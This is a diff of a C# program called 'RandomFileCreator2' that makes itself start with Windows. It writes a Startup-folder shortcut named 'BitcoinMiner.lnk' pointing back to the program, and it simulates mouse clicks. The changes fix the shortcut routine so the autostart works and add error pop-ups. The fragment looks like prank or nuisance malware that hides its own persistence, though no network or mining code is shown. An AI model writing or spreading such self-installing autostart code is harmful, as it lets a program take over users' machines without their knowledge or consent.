@@ -37,15 +37,18 @@ namespace RandomFileCreator2
                 if (System.IO.File.Exists(startUp))
                     Run();
                 CreateShortcut(startUp);
-            } catch (Exception)
+            }
+            catch (Exception e)
             {
+                MessageBox.Show(e.Message);
                 try
                 {
                     string userStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BitcoinMiner.lnk";
                     if (System.IO.File.Exists(userStartUp))
                         Run();
                     CreateShortcut(userStartUp);
-                } catch (Exception) { }
+                }
+                catch (Exception ex) { }
             }
 
             Run();
@@ -76,7 +79,8 @@ namespace RandomFileCreator2
             try
             {
                 mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
-            } catch (Exception)
+            }
+            catch (Exception)
             {
                 DoMouseClick();
             }
@@ -85,11 +89,11 @@ namespace RandomFileCreator2
         public static void CreateShortcut(string targetPath)
         {
             WshShell shell = new WshShell();
-            string shortcutAddress = appPath;
+            string shortcutAddress = targetPath;
             IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
             shortcut.Description = "";
             shortcut.Hotkey = "Ctrl+Shift+N";
-            shortcut.TargetPath = targetPath;
+            shortcut.TargetPath = appPath;
             shortcut.Save();
         }
     }
